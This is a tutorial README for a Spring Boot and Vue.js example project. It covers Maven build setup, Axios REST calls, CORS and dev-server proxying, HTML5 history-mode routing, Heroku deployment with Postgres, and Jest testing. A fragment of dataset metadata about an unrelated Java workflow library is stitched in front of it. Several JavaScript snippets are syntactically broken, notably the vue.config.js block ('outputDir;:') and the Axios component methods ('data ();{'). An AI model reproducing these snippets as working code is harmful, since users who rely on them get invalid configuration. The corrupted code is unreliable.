",0,2,1,apache-2.0,0.0,"['workflow', 'build', 'advanced', 'java', 'application', 'ai', 'based', 'flexible', 'stateful', 'workflow', 'overview', 'workflow', 'dynamic', 'stateful', 'workflow', 'engine', 'crafted', 'java', 'library', 'drawing', 'inspiration', 'graph', 'network', 'library', 'empowers', 'developer', 'granular', 'control', 'flow', 'state', 'application', 'engine', 'building', 'sophisticated', 'ai', 'application', 'approach', 'using', 'modern', 'paradigm', 'agent', 'architecture', 'application', 'flow', 'state', 'pivotal', 'enables', 'crafting', 'custom', 'behavior', 'leading', 'significant', 'reduction', 'hallucination', 'increase', 'response', 'reliability', 'workflow', 'influenced', 'langgraph', 'graphviz', 'apache', 'beam', 'offer', 'multitude', 'benefit', 'allows', 'define', 'custom', 'workflow', 'graph', 'iteratively', 'cycle', 'flexibility', 'control', 'conditional', 'decision', 'benefit', 'indispensable', 'building', 'advanced', 'ai', 'application', 'workflow', 'designed', 'integrate', 'seamlessly', 'enabling', 'define', 'custom', 'workflow', 'using', 'feature', 'offer', 'integration', 'could', 'provide', 'comprehensive', 'toolset', 'building', 'advanced', 'ai', 'application', 'starring', 'find', 'repository', 'beneficial', 'forget', 'give', 'star', 'support', 'increase', 'chance', 'merged', 'codebase', 'simple', 'way', 'show', 'appreciation', 'help', 'project', 'grow', 'key', 'feature', 'stateful', 'workflow', 'stateful', 'engine', 'enabling', 'design', 'custom', 'state', 'pojo', 'transition', 'feature', 'provides', 'robust', 'foundation', 'managing', 'flow', 'state', 'application', 'workflow', 'offering', 'flexibility', 'define', 'custom', 'workflow', 'multiple', 'direction', 'round', 'trip', 'cyclic', 'feature', 'allows', 'intricate', 'control', 'flow', 'application', 'flexible', 'workflow', 'designed', 'flexibility', 'mind', 'define', 'custom', 'workflow', 'append', 'point', 'rag', 'paradigm', 'modular', 'rag', 'flexibility', 'allows', 'high', 'degree', 'customization', 'iterative', 'engine', 'support', 'implementation', 'loop', 'conditionals', 'custom', 'workflow', 'feature', 'allows', 'complex', 'logic', 'flow', 'control', 'within', 'workflow', 'streaming', 'support', 'workflow', 'support', 'streaming', 'output', 'produced', 'node', 'feature', 'allows', 'processing', 'response', 'application', 'integration', 'workflow', 'designed', 'integrate', 'seamlessly', 'enabling', 'define', 'custom', 'workflow', 'using', 'feature', 'offer', 'integration', 'provides', 'comprehensive', 'toolset', 'building', 'advanced', 'ai', 'application', 'visualization', 'engine', 'support', 'generation', 'workflow', 'image', 'feature', 'allows', 'visualize', 'flow', 'computed', 'app', 'workflow', 'default', 'us', 'lib', 'generate', 'image', 'implement', 'image', 'generator', 'interface', 'installation', 'example', 'workflow', 'notion', 'state', 'play', 'pivotal', 'role', 'every', 'execution', 'graph', 'initiate', 'state', 'transferred', 'among', 'node', 'execution', 'node', 'execution', 'update', 'internal', 'state', 'return', 'value', 'method', 'graph', 'update', 'internal', 'state', 'determined', 'function', 'add', 'following', 'dependency', 'file', 'define', 'stateful', 'bean', 'field', 'used', 'store', 'state', 'workflow', 'create', 'simple', 'workflow', 'node', 'conditional', 'edge', 'check', 'output', 'workflow', 'execution', 'print', 'computed', 'transition', 'generate', 'workflow', 'image', 'computed', 'transition', 'llm', 'example', 'check', 'example', 'repository', 'please', 'note', 'example', 'modified', 'example', 'added', 'time', 'moa', 'moa', 'java', 'example', 'based', 'paper', 'http', 'rag', 'corrective', 'rag', 'crag', 'java', 'example', 'based', 'paper', 'http', 'adaptive', 'rag', 'java', 'example', 'soon', 'based', 'paper', 'http', 'self', 'rag', 'java', 'example', 'soon', 'based', 'paper', 'http', 'modular', 'rag', 'java', 'example', 'soon', 'based', 'paper', 'http', 'agent', 'architecture', 'collaboration', 'java', 'example', 'soon', 'based', 'paper', 'http', 'agent', 'supervisor', 'java', 'example', 'soon', 'based', 'paper', 'http', 'planning', 'agent', 'java', 'example', 'soon', 'based', 'paper', 'http', 'contribute', 'feedback', 'feedback', 'suggestion', 'want', 'contribute', 'please', 'feel', 'free', 'open', 'issue', 'pull', 'request', 'open', 'new', 'idea', 'suggestion', 'help', 'u', 'maturity', 'project', 'make', 'useful', 'community', 'order', 'merge', 'source', 'code', 'author', 'carlos', 'zela']","['workflow', 'example', 'java', 'application', 'based']",18,0,0,"['workflow', 'overview', 'key', 'feature', 'installation', 'example', 'llm', 'example', 'moa', 'rag', 'agent', 'architecture', 'contribute', 'feedback', 'author']",11,"['example', 'workflow', 'overview', 'key', 'feature']",6,0.0,1.0,[],0.0,1.0,0.0,9328,28.25,5.5124698310539015,"['LangGraph -> https://langchain-ai.github.io/langgraph/tutorials/introduction/', 'Graphviz -> https://graphviz.gitlab.io/Gallery/directed/', 'Apache Beam -> https://beam.apache.org/', 'LangChain4j -> https://docs.langchain4j.dev/', 'LangChain4j -> https://docs.langchain4j.dev/', 'langchain4j-worflow-examples -> https://github.com/czelabueno/langchain4j-workflow-examples', '`langchain4j-moa` -> https://github.com/czelabueno/langchain4j-workflow-examples/tree/main/langchain4j-moa', '`langchain4j-corrective-rag` -> https://github.com/czelabueno/langchain4j-workflow-examples/tree/main/langchain4j-corrective-rag', '@c_zela -> https://x.com/c_zela']",9
baby1194/spring-boot-vuejs,master,"# spring-boot-vuejs

[![Build Status](https://github.com/jonashackt/spring-boot-vuejs/workflows/build/badge.svg)](https://github.com/jonashackt/spring-boot-vuejs/actions)
[![codecov](https://codecov.io/gh/jonashackt/spring-boot-vuejs/branch/master/graph/badge.svg?token=gMQBTyKuKS)](https://codecov.io/gh/jonashackt/spring-boot-vuejs)
[![License](http://img.shields.io/:license-mit-blue.svg)](https://github.com/jonashackt/spring-boot-vuejs/blob/master/LICENSE)
[![renovateenabled](https://img.shields.io/badge/renovate-enabled-yellow)](https://renovatebot.com)
[![versionspringboot](https://img.shields.io/badge/dynamic/xml?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/pom.xml&query=%2F%2A%5Blocal-name%28%29%3D%27project%27%5D%2F%2A%5Blocal-name%28%29%3D%27parent%27%5D%2F%2A%5Blocal-name%28%29%3D%27version%27%5D&label=springboot)](https://github.com/spring-projects/spring-boot)
[![versionjava](https://img.shields.io/badge/jdk-8,_11,_15-brightgreen.svg?logo=java)](https://github.com/spring-projects/spring-boot)
[![versionvuejs](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.vue&label=vue&logo=vue.js)](https://vuejs.org/)
[![versiontypescript](https://img.shields.io/badge/dynamic/json?color=blue&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.devDependencies.typescript&label=typescript&logo=typescript)](https://www.typescriptlang.org/)
[![versionbootstrap](https://img.shields.io/badge/dynamic/json?color=blueviolet&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.bootstrap&label=bootstrap&logo=bootstrap.js)](https://getbootstrap.com/)
[![versionnodejs](https://img.shields.io/badge/dynamic/xml?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/pom.xml&query=%2F%2A%5Blocal-name%28%29%3D%27project%27%5D%2F%2A%5Blocal-name%28%29%3D%27build%27%5D%2F%2A%5Blocal-name%28%29%3D%27plugins%27%5D%2F%2A%5Blocal-name%28%29%3D%27plugin%27%5D%2F%2A%5Blocal-name%28%29%3D%27executions%27%5D%2F%2A%5Blocal-name%28%29%3D%27execution%27%5D%2F%2A%5Blocal-name%28%29%3D%27configuration%27%5D%2F%2A%5Blocal-name%28%29%3D%27nodeVersion%27%5D&label=nodejs&logo=node.js)](https://nodejs.org/en/)
[![versionwebpack](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.webpack.version&label=webpack&logo=webpack)](https://webpack.js.org/)
[![versionaxios](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.axios&label=axios)](https://github.com/axios/axios)
[![versionjest](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.jest.version&label=jest&logo=jest)](https://jestjs.io/)
[![versionnightwatch](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.nightwatch.version&label=nightwatch)](http://nightwatchjs.org/)
[![Deployed on Heroku](https://img.shields.io/badge/heroku-deployed-blueviolet.svg?logo=heroku)](https://spring-boot-vuejs.herokuapp.com/)
[![Pushed to Docker Hub](https://img.shields.io/badge/docker_hub-released-blue.svg?logo=docker)](https://hub.docker.com/r/jonashackt/spring-boot-vuejs)
    
> **If you´re a JavaMagazin / blog.codecentric.de / Softwerker reader**, consider switching to [vue-cli-v2-webpack-v3](https://github.com/jonashackt/spring-boot-vuejs/tree/vue-cli-v2-webpack-v3)

![localhost-first-run](screenshots/localhost-first-run.png)

A live deployment is available on Heroku: https://spring-boot-vuejs.herokuapp.com

This project is used as example in a variety of articles & as eBook:

[![java-magazin-8.2018](screenshots/java-magazin-8.2018.png)](https://jaxenter.de/ausgaben/java-magazin-8-18)
[![entwickler-press-092018](screenshots/entwickler-press-092018.jpg)](https://www.amazon.com/Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook/dp/B07HQF9VX4/ref=sr_1_1?ie=UTF8&qid=1538484852&sr=8-1&keywords=Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook)
[![softwerker-vol12](screenshots/softwerker-vol12.png)](https://info.codecentric.de/softwerker-vol-12)

[blog.codecentric.de/en/2018/04/spring-boot-vuejs](https://blog.codecentric.de/en/2018/04/spring-boot-vuejs) | [JavaMagazin 8.2018](https://jaxenter.de/ausgaben/java-magazin-8-18) | [entwickler.press shortcuts 229](https://www.amazon.com/Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook/dp/B07HQF9VX4/ref=sr_1_1?ie=UTF8&qid=1538484852&sr=8-1&keywords=Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook) | [softwerker Vol.12](https://info.codecentric.de/softwerker-vol-12)

## Upgrade procedure

Get newest node & npm:
```shell
brew upgrade node
npm install -g npm@latest
```

Update vue-cli
```shell
npm install -g @vue/cli
```

Update Vue components/plugins (see https://cli.vuejs.org/migrating-from-v3/#upgrade-all-plugins-at-once)
```shell
vue upgrade
```

## In Search of a new Web Frontend-Framework after 2 Years of absence...

Well, I’m not a Frontend developer. I’m more like playing around with Spring Boot, Web- & Microservices & Docker, automating things with Ansible and Docker, Scaling things with Spring Cloud, Docker Compose, and Traefik... And the only GUIs I’m building are the ""new JS framework in town""-app every two years... :) So the last one was Angular 1 - and it felt, as it was a good choice! I loved the coding experience and after a day of training, I felt able to write awesome Frontends...

But now we’re 2 years later and I heard from afar, that there was a complete rewrite of Angular (2), a new kid in town from Facebook (React) and lots of ES201x stuff and dependency managers like bower and Co. So I’m now in the new 2-year-cycle of trying to cope up again - and so glad I found this article: https://medium.com/reverdev/why-we-moved-from-angular-2-to-vue-js-and-why-we-didnt-choose-react-ef807d9f4163

Key points are:
* Angular 2 isn’t the way to go if you know version 1 (complete re-write, only with Typescript, loss of many of 1’s advantages, Angular 4 is coming)
* React  (facebookish problems (licence), need to choose btw. Redux & MObX, harder learning curve, slower coding speed)

![comparison-angular-react-vuejs](screenshots/comparison-angular-react-vuejs.png)

And the [introduction phrase](https://vuejs.org/v2/guide/index.html) sounds really great:

> Vue (pronounced /vjuː/, like view) is a progressive framework for building user interfaces. Unlike other monolithic frameworks, Vue is designed from the ground up to be incrementally adoptable. The core library is focused on the view layer only and is very easy to pick up and integrate with other libraries or existing projects. On the other hand, Vue is also perfectly capable of powering sophisticated Single-Page Applications when used in combination with modern tooling and supporting libraries.

So I think, it could be a good idea to invest a day or so into Vue.js. Let’s have a look here!



## Setup Vue.js & Spring Boot

### Prerequisites

#### MacOSX

```
brew install node
npm install -g @vue/cli
```

#### Linux

```
sudo apt update
sudo apt install node
npm install -g @vue/cli
```

#### Windows

```
choco install npm
npm install -g @vue/cli
```

## Project setup

```
spring-boot-vuejs
├─┬ backend     → backend module with Spring Boot code
│ ├── src
│ └── pom.xml
├─┬ frontend    → frontend module with Vue.js code
│ ├── src
│ └── pom.xml
└── pom.xml     → Maven parent pom managing both modules
```

## Backend

Go to https://start.spring.io/ and initialize a Spring Boot app with `Web` and `Actuator`. Place the zip’s contents in the backend folder.

Customize pom to copy content from Frontend for serving it later with the embedded Tomcat:

```xml
<build>
  <plugins>
    <plugin>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-maven-plugin</artifactId>
    </plugin>
    <plugin>
      <artifactId>maven-resources-plugin</artifactId>
      <executions>
        <execution>
          <id>copy Vue.js frontend content</id>
          <phase>generate-resources</phase>
          <goals>
            <goal>copy-resources</goal>
          </goals>
          <configuration>
            <outputDirectory>src/main/resources/public</outputDirectory>
            <overwrite>true</overwrite>
            <resources>
              <resource>
                <directory>${project.parent.basedir}/frontend/target/dist</directory>
                <includes>
                  <include>static/</include>
                  <include>index.html</include>
                  <include>favicon.ico</include>
                </includes>
              </resource>
            </resources>
          </configuration>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>
```


## Frontend

Creating our `frontend` project is done by the slightly changed (we use `--no-git` here, because our parent project is already a git repository and otherwise vue CLI 3 would initialize an new one):

```
vue create frontend --no-git
```

see https://cli.vuejs.org/guide/

This will initialize a project skeleton for Vue.js in /frontend directory - it, therefore, asks some questions in the cli:

![vuejs-cli3-create](screenshots/vuejs-cli3-create.png)

__Do not__ choose the default preset with `default (babel, eslint)`, because we need some more plugins for our project here (choose the Plugins with the __space bar__):

![vuejs-cli3-select-plugins](screenshots/vuejs-cli3-select-plugins.png)

You can now also use the new `vue ui` command/feature to configure your project:

![vue-ui](screenshots/vue-ui.png)

If you want to learn more about installing Vue.js, head over to the docs: https://vuejs.org/v2/guide/installation.html


### Use frontend-maven-plugin to handle NPM, Node, Bower, Grunt, Gulp, Webpack and so on :)

If you’re a backend dev like me, this Maven plugin here https://github.com/eirslett/frontend-maven-plugin is a great help for you - because, if you know Maven, that’s everything you need! Just add this plugin to the frontend’s `pom.xml`:

```xml
<build>
    <plugins>
        <plugin>
            <groupId>com.github.eirslett</groupId>
            <artifactId>frontend-maven-plugin</artifactId>
            <version>${frontend-maven-plugin.version}</version>
            <executions>
                <!-- Install our node and npm version to run npm/node scripts-->
                <execution>
                    <id>install node and npm</id>
                    <goals>
                        <goal>install-node-and-npm</goal>
                    </goals>
                    <configuration>
                        <nodeVersion>v10.10.0</nodeVersion>
                    </configuration>
                </execution>
                <!-- Install all project dependencies -->
                <execution>
                    <id>npm install</id>
                    <goals>
                        <goal>npm</goal>
                    </goals>
                    <!-- optional: default phase is ""generate-resources"" -->
                    <phase>generate-resources</phase>
                    <!-- Optional configuration which provides for running any npm command -->
                    <configuration>
                        <arguments>install</arguments>
                    </configuration>
                </execution>
                <!-- Build and minify static files -->
                <execution>
                    <id>npm run build</id>
                    <goals>
                        <goal>npm</goal>
                    </goals>
                    <configuration>
                        <arguments>run build</arguments>
        </configuration>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

### Tell Webpack to output the dist/ contents to target/

Commonly, node projects will create a dist/ directory for builds which contains the minified source code of the web app - but we want it all in `/target`. Therefore we need to create the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js) and configure the `outputDir` and `assetsDir` correctly: 

```javascript
module.exports = {
  ...
  // Change build paths to make them Maven compatible
  // see https://cli.vuejs.org/config/
  outputDir;: 'target/dist',
  assetsDir;: 'static';
}
```


## First App run

Inside the root directory, do a: 

```
mvn clean install
```

Run our complete Spring Boot App:

```
mvn --projects backend spring-boot:run
```

Now go to http://localhost:8098/ and have a look at your first Vue.js Spring Boot App.



## Faster feedback with webpack-dev-server

The webpack-dev-server, which will update and build every change through all the parts of the JavaScript build-chain, is pre-configured in Vue.js out-of-the-box! So the only thing needed to get fast feedback development-cycle is to cd into `frontend` and run:

```
npm run serve
```

That’s it! 


## Browser developer tools extension

Install vue-devtools Browser extension https://github.com/vuejs/vue-devtools and get better feedback, e.g. in Chrome:

![vue-devtools-chrome](screenshots/vue-devtools-chrome.png)


## IntelliJ integration

There's a blog post: https://blog.jetbrains.com/webstorm/2018/01/working-with-vue-js-in-webstorm/

Especially the `New... Vue Component` looks quite cool :)



## HTTP calls from Vue.js to (Spring Boot) REST backend

Prior to Vue 2.0, there was a build in solution (vue-resource). But from 2.0 on, 3rd party libraries are necessary. One of them is [Axios](https://github.com/mzabriskie/axios) - also see blog post https://alligator.io/vuejs/rest-api-axios/

```
npm install axios --save
```

Calling a REST service with Axios is simple. Go into the script area of your component, e.g. Hello.vue and add:

```js
import axios from 'axios'

data ();{
  return {
    response: [],
    errors: []
  }
},

callRestService ();{
  axios.get(`api/hello`)
    .then(response => {
      // JSON responses are automatically parsed.
      this.response = response.data
    })
    .catch(e => {
      this.errors.push(e)
    })
}
}
```

In your template area you can now request a service call via calling `callRestService()` method and access `response` data:

```html
<button class=”Search__button” @click=""callRestService()"">CALL Spring Boot REST backend service</button>

<h3>{{ response }}</h3>
```

### The problem with SOP

Single-Origin Policy (SOP) could be a problem if we want to develop our app. Because the webpack-dev-server runs on http://localhost:8080 and our Spring Boot REST backend on http://localhost:8098.

We need to use Cross-Origin Resource Sharing Protocol (CORS) to handle that (read more background info about CORS here https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS)


#### Enabling Axios CORS support

Create a central Axios configuration file called `http-commons.js`:

```js
import axios from 'axios'

export const AXIOS = axios.create({
  baseURL: `http://localhost:8098`,
  headers: {
    'Access-Control-Allow-Origin': 'http://localhost:8080'
  }
})
```

Here we allow requests to the base URL of our Spring Boot App on port 8098 to be accessible from 8080.

Now we could use this configuration inside our Components, e.g. in `Hello.vue`:
```js
import {AXIOS} from './http-common'

export default {
  name: 'hello',

  data () {
    return {
      posts: [],
      errors: []
    }
  },
  methods: {
    // Fetches posts when the component is created.
    callRestService () {
      AXIOS.get(`hello`)
        .then(response => {
          // JSON responses are automatically parsed.
          this.posts = response.data
        })
        .catch(e => {
          this.errors.push(e)
        })
    }
  }
```

#### Enabling Spring Boot CORS support

Additionally, we need to configure our Spring Boot backend to answer with the appropriate CORS HTTP Headers in its responses (there's a good tutorial here: https://spring.io/guides/gs/rest-service-cors/). Therefore we add the annotation `@CrossOrigin` to our BackendController:

```java
@CrossOrigin(origins = ""http://localhost:8080"")
@RequestMapping(path = ""/hello"")
public @ResponseBody String sayHello() {
    LOG.info(""GET called on /hello resource"");
    return HELLO_TEXT;
}
```

Now our Backend will respond CORS-enabled and will accept requests from 8080. But as this only enables CORS on one method, we have to repeatedly add this annotation to all of our REST endpoints, which isn’t a nice style. We should use a global solution to allow access with CORS enabled to all of our REST resources. This could be done in the `SpringBootVuejsApplication.class`:

```java
// Enable CORS globally
@Bean
public WebMvcConfigurer corsConfigurer() {
  return new WebMvcConfigurerAdapter() {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
      registry.addMapping(""/api/*"").allowedOrigins(""http://localhost:8080"");
    }
  };
}
```

Now all calls to resources behind `api/` will return the correct CORS headers. 


#### But STOP! Webpack & Vue have something much smarter for us to help us with SOP!

Thanks to my colleague [Daniel](https://www.codecentric.de/team/dre/) who pointed me to the nice proxying feature of Webpack dev-server, we don't need to configure all the complex CORS stuff anymore!

According to the [Vue CLI 3 docs](https://cli.vuejs.org/config) the only thing we need to [configure is a devserver-proxy](https://cli.vuejs.org/config/#devserver-proxy) for our webpack devserver requests. This could be done easily in the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js) inside `devServer.proxy`: 

```js
module.exports = {
  // proxy all webpack dev-server requests starting with /api
  // to our Spring Boot backend (localhost:8098) using http-proxy-middleware
  // see https://cli.vuejs.org/config/#devserver-proxy
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:8098',
        ws: true,
        changeOrigin: true
      }
    }
  },
  ...
}
```

With this configuration in place, the webpack dev-server uses the [http-proxy-middleware](https://github.com/chimurai/http-proxy-middleware), which is a really handy component, to proxy all frontend-requests from http://localhost:8080 --> http://localhost:8098 - incl. Changing the Origin accordingly.

This is used in the webpack build process to configure the proxyMiddleware (you don't need to change something here!):

```js
// proxy api requests
Object.keys(proxyTable).forEach(function (context) {
  var options = proxyTable[context];
  if (typeof options === 'string') {
    options = { target: options }
  }
  app.use(proxyMiddleware(options.filter || context, options))
})
```

## Using history mode for nicer URLs

If we use the default configuration of the generated Vue.js template, we see URLs with a `#` inside them - like this:

```
http://localhost:8098/#/bootstrap

or

http://localhost:8098/#/user
```

With the usage of __[HTML5 history mode](https://router.vuejs.org/guide/essentials/history-mode.html#html5-history-mode)__, we can achieve much nicer URLs without the `#` in them. Only thing to do in the Vue.js frontend is to configure our router accordingly inside the [router.js](frontend/src/router.js):

```
...

Vue.use(Router);

const router = new Router({
    mode: 'history', // uris without hashes #, see https://router.vuejs.org/guide/essentials/history-mode.html#html5-history-mode
    routes: [
        { path: '/', component: Hello },
        { path: '/callservice', component: Service },
        ...
```

That's nearly everything. BUT only nearly! If one clicks on a link inside our frontend, the user is correctly send to the wished component. 

But if the user enters the URL directly into the Browser, we get a `Whitelabel Error Page` because our Spring Boot backend gives us a __HTTP 404__ - since this URL isn't present in the backend:

![html5-history-mode-whitelabel-error-page-404](screenshots/html5-history-mode-whitelabel-error-page-404.gif)

The solution is to redirect or better forward the user to the frontend (router) again. The [Vue.js docs don't provide an example configuration for Spring Boot](https://router.vuejs.org/guide/essentials/history-mode.html#example-server-configurations), but luckily [there are other resources](https://www.baeldung.com/spring-redirect-and-forward). In essence we have to implement a forwarding controller in our [BackendController](backend/src/main/java/de/jonashackt/springbootvuejs/controller/BackendController.java):

```
    // Forwards all routes to FrontEnd except: '/', '/index.html', '/api', '/api/**'
    // Required because of 'mode: history' usage in frontend routing, see README for further details
    @RequestMapping(value = ""{_:^(?!index\\.html|api).$}"")
    public String redirectApi() {
        LOG.info(""URL entered directly into the Browser, so we need to redirect..."");
        return ""forward:/"";
    }
```

This controller will forward every request other then `'/', '/index.html', '/api', '/api/**'` to our Vue.js frontend.


## Bootstrap & Vue.js

There’s a nice integration of Bootstrap in Vue.js: https://bootstrap-vue.js.org/

```
npm install bootstrap-vue
```

Now you can use all the pretty Bootstrap stuff with ease like:

```
<b-btn @click=""callRestService()"">CALL Spring Boot REST backend service</b-btn>
```

instead of

```
<button type=""button"" class=”btn” @click=""callRestService()"">CALL Spring Boot REST backend service</button>
```

The docs contain all the possible components: https://bootstrap-vue.js.org/docs/components/alert/

See some elements, when you go to http://localhost:8080/#/bootstrap/ - this should look like this:

![bootstrap-styled-vuejs](screenshots/bootstrap-styled-vuejs.png)

A good discussion about various UI component frameworks: http://vuetips.com/bootstrap


## Heroku Deployment

As you may already read, the app is automatically deployed to Heroku on https://spring-boot-vuejs.herokuapp.com/.

The project makes use of the nice Heroku Pipelines feature, where we do get a full Continuous Delivery pipeline with nearly no effort:

![heroku-pipeline](screenshots/heroku-pipeline.png)

And with the help of super cool `Automatic deploys`, we have our GitHub Actions build our app after every push to master - and with the checkbox set to `Wait for CI to pass before deploy` - the app gets also automatically deployed to Heroku - but only, if the GitHub Actions (and Codegov...) build succeeded:

![heroku-automatic-deploys](screenshots/heroku-automatic-deploys.png)

You only have to connect your Heroku app to GitHub, activate Automatic deploys and set the named checkbox. That's everything!


#### Accessing Spring Boot REST backend on Heroku from Vue.js frontend

Frontend needs to know the Port of our Spring Boot backend API, which is [automatically set by Heroku every time, we (re-)start our App](https://stackoverflow.com/a/12023039/4964553).

> You can [try out your Heroku app locally](https://devcenter.heroku.com/articles/heroku-local)! Just create a .env-File with all your Environment variables and run `heroku local`! 

To access the Heroku set port, we need to use relative paths inside our Vue.js application instead of hard-coded hosts and ports! 

All we need to do is to configure Axios in such a way inside our [frontend/src/components/http-common.js](https://github.com/jonashackt/spring-boot-vuejs/blob/master/frontend/src/components/http-common.js):

```
export const AXIOS = axios.create({
  baseURL: `/api`
})
```

#### Using Heroku's Postgres as Database for Spring Boot backend and Vue.js frontend

First, add [Heroku Postgres database](https://elements.heroku.com/addons/heroku-postgresql) for your Heroku app. 

Then follow these instructions on Stackoverflow to configure all needed Environment variables in Heroku: https://stackoverflow.com/a/49978310/4964553

Mind the addition to the backend's [pom.xml](backend/pom.xml) described here: https://stackoverflow.com/a/49970142/4964553

Now you're able to use Spring Data's magic - all you need is an Interface like [UserRepository.java](backend/src/main/java/de/jonashackt/springbootvuejs/repository/UserRepository.java):

```java
package de.jonashackt.springbootvuejs.repository;

import de.jonashackt.springbootvuejs.domain.User;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.query.Param;

import java.util.List;

public interface UserRepository extends CrudRepository<User, Long> {

    List<User> findByLastName(@Param(""lastname"") String lastname);

    List<User> findByFirstName(@Param(""firstname"") String firstname);

}

```

Now write your Testcases accordingly like [UserRepositoryTest.java](backend/src/test/java/de/jonashackt/springbootvuejs/repository/UserRepositoryTest.java):

```java
package de.jonashackt.springbootvuejs.repository;

import de.jonashackt.springbootvuejs.domain.User;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;
import org.springframework.boot.test.autoconfigure.orm.jpa.TestEntityManager;
import org.springframework.test.context.junit4.SpringRunner;

import java.util.List;

import static org.hamcrest.Matchers.contains;
import static org.junit.Assert.*;

@RunWith(SpringRunner.class)
@DataJpaTest
public class UserRepositoryTest {

  @Autowired
  private TestEntityManager entityManager;

  @Autowired
  private UserRepository users;

  private final User norbertSiegmund = new User(""Norbert"", ""Siegmund"");
  private final User jonasHecht = new User(""Jonas"", ""Hecht"");

  @Before
  public void fillSomeDataIntoOurDb() {
    // Add new Users to Database
    entityManager.persist(norbertSiegmund);
    entityManager.persist(jonasHecht);
  }

  @Test
  public void testFindByLastName() throws Exception {
    // Search for specific User in Database according to lastname
    List<User> usersWithLastNameSiegmund = users.findByLastName(""Siegmund"");

    assertThat(usersWithLastNameSiegmund, contains(norbertSiegmund));
  }


  @Test
  public void testFindByFirstName() throws Exception {
    // Search for specific User in Database according to firstname
    List<User> usersWithFirstNameJonas = users.findByFirstName(""Jonas"");

    assertThat(usersWithFirstNameJonas, contains(jonasHecht));
  }

}
```

Then include this functionality in your REST-API - see [BackendController.java](backend/src/main/java/de/jonashackt/springbootvuejs/controller/BackendController.java):

```java
    @RequestMapping(path = ""/user"", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.CREATED)
    public @ResponseBody long addNewUser (@RequestParam String firstName, @RequestParam String lastName) {
        User user = new User(firstName, lastName);
        userRepository.save(user);

        LOG.info(user.toString() + "" successfully saved into DB"");

        return user.getId();
    }
```
 
and use it from the Vue.js frontend, see [User.vue](frontend/src/components/User.vue):

```html
<template>
<div class=""user"">
 <h1>Create User</h1>

 <h3>Just some database interaction...</h3>

 <input type=""text"" v-model=""user.firstName"" placeholder=""first name"">
 <input type=""text"" v-model=""user.lastName"" placeholder=""last name"">

 <button @click=""createUser()"">Create User</button>

 <div v-if=""showResponse""><h6>User created with Id: {{ response }}</h6></div>

 <button v-if=""showResponse"" @click=""retrieveUser()"">Retrieve user {{user.id}} data from database</button>

 <h4 v-if=""showRetrievedUser"">Retrieved User {{retrievedUser.firstName}} {{retrievedUser.lastName}}</h4>

</div>
</template>

<script>
// import axios from 'axios'
import {AXIOS} from './http-common'

export default {
 name: 'user',

 data () {
   return {
     response: [],
     errors: [],
     user: {
       lastName: '',
       firstName: '',
       id: 0
     },
     showResponse: false,
     retrievedUser: {},
     showRetrievedUser: false
   }
 },
 methods: {
   // Fetches posts when the component is created.
   createUser () {
     var params = new URLSearchParams();
     params.append('firstName', this.user.firstName);
     params.append('lastName', this.user.lastName);

     AXIOS.post(`/user`, params)
       .then(response => {
         // JSON responses are automatically parsed.
         this.response = response.data;
         this.user.id = response.data;
         console.log(response.data);
         this.showResponse = true
       })
       .catch(e => {
         this.errors.push(e)
       })
   },
   retrieveUser () {
     AXIOS.get(`/user/` + this.user.id)
       .then(response => {
         // JSON responses are automatically parsed.
         this.retrievedUser = response.data;
         console.log(response.data);
         this.showRetrievedUser = true
       })
       .catch(e => {
         this.errors.push(e)
       })
   }
 }
}

</script>
```


## Testing 

### Install vue-test-utils

https://github.com/vuejs/vue-test-utils

`npm install --save-dev @vue/test-utils`

### Jest

Jest is a new shooting star in the sky of JavaScript testing frameworks: https://facebook.github.io/jest/

Intro-Blogpost: https://blog.codecentric.de/2017/06/javascript-unit-tests-sind-schwer-aufzusetzen-keep-calm-use-jest/

Examples: https://github.com/vuejs/vue-test-utils-jest-example

Vue.js Jest Docs: https://vue-test-utils.vuejs.org/guides/#testing-single-file-components-with-jest

A Jest Unittest looks like [Hello.spec.js](frontend/test/components/Hello.spec.js):

```js
import { shallowMount } from '@vue/test-utils';
import Hello from '@/components/Hello'

describe('Hello.vue', () => {
  it('should render correct hello message', () => {
    // Given
    const hellowrapped = shallowMount(Hello, {
      propsData: { hellomsg: 'Welcome to your Jest powered Vue.js App' },
      stubs: ['router-link', 'router-view']
    });

    // When
    const contentH1 = hellowrapped.find('h1');

    // Then
    expect(contentH1.text()).toEqual('Welcome to your Jest powered Vue.js App');
  })
})
```

To pass Component props while using Vue.js Router, see https://stackoverflow.com/a/37940045/4964553.

